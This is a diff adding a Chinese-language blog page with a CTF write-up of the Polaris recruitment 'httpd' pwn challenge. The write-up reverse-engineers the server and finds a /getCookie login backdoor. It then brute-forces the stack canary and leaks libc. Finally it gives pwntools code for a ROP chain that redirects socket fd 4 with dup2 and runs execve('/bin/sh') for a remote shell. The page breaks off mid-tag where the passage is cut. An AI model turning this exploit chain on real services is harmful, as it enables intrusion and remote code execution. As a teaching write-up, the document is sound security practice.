@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <!-- 字体 (霞鹜文楷 LXGW WenKai Webfont) -->
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin />
+  <link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.min.css" />
+  <!-- favicon -->
+  <link rel="shortcut icon" href="/images/favicon.ico">
+<link rel="stylesheet" href="/css/style.css">
+
+
+  <!-- activeTitle -->
+  
+  <!-- inactiveTitle -->
+  
+
+  <title>web-pwn初探 Polaris招新httpd</title>
+  <!-- 注入配置到全局变量 -->
+  <script>
+    window.SITE_CONFIG = {
+      root: '/',
+      activeTitle: 'web-pwn初探 Polaris招新httpd',
+      inactiveTitle: '|ω･`)暗中观察',
+      gsap: {"enable":true,"entrance_stagger":0.08,"scroll_trigger":true,"parallax":true,"hover_effect":true}
+    };
+  </script>
+
+  <!-- 引入 GSAP 核心库及 ScrollTrigger 插件 -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+
+  <!-- 加载JS文件 -->
+  
+<script src="/js/head.js"></script>
+<script src="/js/iconfont.js"></script>
+<script src="/js/header.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body class="">
+    <div id="swiper-container">
+  <img
+    src="/images/swiper.jpg"
+    alt="轮播图" />
+  <div class="shadow"></div>
+</div>
+
+    <div class="body-page-view"><div id="header-container" class="header-top">
+  <div class="logo">
+    <a href="/">
+       YoruKumo 
+    </a>
+  </div>
+
+  <button class="menu-toggle" aria-label="Toggle Menu" aria-expanded="false">
+    <span class="line line-1"></span>
+    <span class="line line-2"></span>
+    <span class="line line-3"></span>
+  </button>
+
+  <nav class="nav-menu">
+    <ul class="nav-list">
+       
+      <li>
+        <a href="/">首页</a>
+      </li>
+      
+      <li>
+        <a href="/posts">文章</a>
+      </li>
+      
+      <li>
+        <a href="/stats">统计</a>
+      </li>
+      
+      <li>
+        <a href="/about">关于</a>
+      </li>
+       
+    </ul>
+  </nav>
+</div>
+
+<div class="post-page">
+  <main class="post-container">
+    <article class="post-article">
+      <header class="post-header">
+        <h1 class="post-title">web-pwn初探 Polaris招新httpd</h1>
+        <div class="post-meta">
+          <div class="meta-item">
+            <p class="post-time">2026-09-08 00:00</p>
+          </div>
+           
+          <p class="meta-item">
+            <a class="post-tag-none-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="post-tag-none-link" href="/tags/PWN/" rel="tag">PWN</a>
+          </p>
+          
+        </div>
+      </header>
+
+      <div class="post-content"><p><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903105752.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>进入浏览器看看<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903105725.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>随便试了试账号密码登录不进去<br>先逆向一下<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903105950.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>fd_1接受请求体<br>login.html里的请求体，方式是POST<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110040.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>账号密码url编码，同时提示我们找&#x2F;login</p>
+<p>fork创建子进程，sub_401a24里应该是主要验证逻辑，处理fd_1请求体<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110117.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>分为GET和POST<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110239.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>登录我们主要看POST<br><code> sub_401C58(fd, (char *)s);</code> 应该是处理请求体，处理完存在s里</p>
+<p>这个看上下文s1应该是分离出请求路径<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903152304.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>这里200应该是登录成功<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110514.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110637.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div></p>
+<p>看看条件验证函数里<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110744.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>这里提取请求体里的username和password存在v3，提取完分别跟s2和s2+32比较<br>而s2是全局变量token，说明账号密码是硬编码在ELF文件里的，我们看看如何编码的<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903110953.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903111004.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>username就是admin<br>密码在 <code>sub_402E52</code> 里生成<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903111220.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>看到rand，srand是跟时间有关，刚开始想的是时间戳爆破，后面才发现其实有登录后门</p>
+<p>这里居然可以直接得到cookie，同时直接登录<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903152540.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903154340.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>只需要访问<br><code>http://localhost:9999/getCookie</code> 就可以登录了<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903154437.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div></p>
+<p>后台可以改密码，或者配置路由，根据之前分析我们知道密码是全局变量，利用比较困难，看看路由配置里有没有栈溢出<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903155651.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>路由配置找&#x2F;config<br>这里<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903155729.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>进入sub_4035a0<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903155841.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>可以看到所有配置信息都是保存在栈上的，当让可以栈溢出打ROP了</p>
+<p>注意到一开始是有fork的，可以爆破canary<br>我们用pwntools得还原请求体<br>bp抓包看看<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903161213.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>请求头 <code>GET /getCookie HTTP/1.1\r\n</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">b&#x27;GET /getCookie HTTP/1.1\r\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>返回<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903161727.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>接收cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie = p.recvuntil(<span class="string">b&#x27;;&#x27;</span>,drop=<span class="literal">True</span>).decode()</span><br><span class="line">log.info(<span class="string">f&#x27;cookie : <span class="subst">&#123;cookie&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>随后我们需要爆破canary<br>先看看config的请求包长啥样<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903164317.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>我们需要构造的请求是，因为要爆破所以选择close</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /config HTTP/1.1</span><br><span class="line">Host: localhost:9999</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=UTF-8</span><br><span class="line">Content-Length: </span><br><span class="line">Cookie: </span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">body</span><br></pre></td></tr></table></figure>
+<p>我们写个函数来构造请求包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">cookie,payload</span>):</span><br><span class="line">    r = remote(HOST, PORT, level=<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    pay = quote(payload).encode()</span><br><span class="line">    body = <span class="string">b&#x27;route_name=TEA-ROUTER&amp;ip=192.168.31.1&amp;subnet_mask=255.255.255.0&amp;gateway=&#x27;</span>+pay</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        POST /config HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: localhost:9999</span></span><br><span class="line"><span class="string">        Content-Type: application/x-www-form-urlencoded;charset=UTF-8</span></span><br><span class="line"><span class="string">        Content-Length:</span></span><br><span class="line"><span class="string">        Cookie:</span></span><br><span class="line"><span class="string">        Connection: close</span></span><br><span class="line"><span class="string">        body</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    header = (</span><br><span class="line">        <span class="string">f&#x27;POST /config HTTP/1.1\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Host: <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Cookie: <span class="subst">&#123;cookie&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Type: application/x-www-form-urlencoded;charset=UTF-8\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;Connection: close\r\n\r\n&#x27;</span></span><br><span class="line">    ).encode()</span><br><span class="line">    r.send(header+body)</span><br><span class="line">    <span class="keyword">return</span> r.recvall()</span><br></pre></td></tr></table></figure>
+
+
+<p><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903170248.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>容易算出到canary的偏移为40<br>可以写爆破脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">f&#x27;exploit canary&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * <span class="number">40</span> + canary + <span class="built_in">bytes</span>([b])</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;500&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> post(cookie, payload):</span><br><span class="line">            canary += <span class="built_in">bytes</span>([b])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">canary = u64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260903173303.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div></p>
+<p>接下来打ROP就行<br>题目没有给libc，我们需要泄露libc地址然后找到对应libc版本<br>接下来打远程，泄露libc</p>
+<p><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904113301.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>我们发现这个write可以控制rdx，如果我们把rax设为很大的数，就可以泄露从栈上开始的数据<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904113503.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904113549.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>这里可以把eax设为很大的数<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904114135.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>可以知道我们如果栈溢出调用这个write，会从canary开始往高地址泄露数据，那么我们在rbp上放想要泄露的地址的指针，也就是got表上任意的，比如我选择printf@got</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(canary) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span> + p64(e.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">8</span>) +p64(add_eax) + p64(write_addr)</span><br></pre></td></tr></table></figure>
+<p>我们调试到这个溢出点：<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904164511.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>额发现不对，rbp应该放是指向printf@got的指针然后+8<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904170146.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>这时候就对了，可以获得libc了</p>
+<p>现在打远程，泄露printf的libc<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904172228.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div></p>
+<p>再来个read<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904174856.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>libc.rip里<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260904174955.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>下一个8.7</p>
+<p>随后就是getshell了，本地先测试<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908135458.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908135516.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908135616.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>可以看到rdi，rsi，rdx等都可以控制<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908135759.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>还有execve可以用，我们直接用execve，省的system要对齐</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">execve_addr = libc_base + <span class="number">0x0000000000eef30</span>  </span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdiaddr = libc_base + <span class="number">0x000000000010f78b</span></span><br><span class="line">pop_rsiaddr = libc_base + <span class="number">0x0000000000110a7d</span></span><br><span class="line">pop_rdxaddr = libc_base + <span class="number">0x00000000000b505c</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(canary) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(pop_rdiaddr) + p64(bin_sh_addr)</span><br><span class="line">payload += p64(pop_rsiaddr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdxaddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># rbp</span></span><br><span class="line">payload += p64(execve_addr)</span><br></pre></td></tr></table></figure>
+<p>然后我们运行<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908135954.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>shell居然弹在服务端<br>这不是我们想要的，需要重定向<br>下断点看看socket端的fd是什么<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908140628.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>这里的v6就是，或者查看fd，在sub_401a24下断点，查看fd地址<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908140959.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908141027.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>fd是4，也就是我们要执行dup2(4,0);dup2(4,1);dup2(4,2)<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908141138.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>rdi和rsi可控<br>payload改为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">execve_addr = libc_base + <span class="number">0x0000000000eef30</span>  </span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdiaddr = libc_base + <span class="number">0x000000000010f78b</span></span><br><span class="line">pop_rsiaddr = libc_base + <span class="number">0x0000000000110a7d</span></span><br><span class="line">pop_rdxaddr = libc_base + <span class="number">0x00000000000b505c</span></span><br><span class="line">dup2_addr   = libc_base + <span class="number">0x0116990</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(canary) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(pop_rdiaddr) + p64(<span class="number">4</span>) + p64(pop_rsiaddr) + p64(<span class="number">0</span>) + p64(dup2_addr)</span><br><span class="line">payload += p64(pop_rdiaddr) + p64(<span class="number">4</span>) + p64(pop_rsiaddr) + p64(<span class="number">1</span>) + p64(dup2_addr)</span><br><span class="line">payload += p64(pop_rdiaddr) + p64(<span class="number">4</span>) + p64(pop_rsiaddr) + p64(<span class="number">2</span>) + p64(dup2_addr)</span><br><span class="line">payload += p64(pop_rdiaddr) + p64(bin_sh_addr)</span><br><span class="line">payload += p64(pop_rsiaddr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdxaddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)        <span class="comment"># rbp</span></span><br><span class="line">payload += p64(execve_addr)</span><br></pre></td></tr></table></figure>
+<p>一直拿不到shell，有点奇怪，调试看看<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908142028.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>发现子进程正常退出了，没有交互<br>应该在子进程r里interactive而不是p<br>改一下post</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">cookie,payload,debug=<span class="literal">False</span>,interact=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> interact:</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> r.recvall()</span><br><span class="line"> </span><br><span class="line">post(cookie,payload,interact=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p>然后本地就可以打通了<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
+       src="/images/posts/Pasted%20image%2020260908142454.png" 
+       alt="" 
+       title="" 
+       loading="lazy" 
+       
+       
+       onload="this.classList.add('loaded');" 
+       onerror="this.parentElement.classList.add('error');">
+  <div class="lazy-image-skeleton"></div>
+</div><br>远程也能打通<br><div class="lazy-image-container" >
+  <img class="lazy-image" 
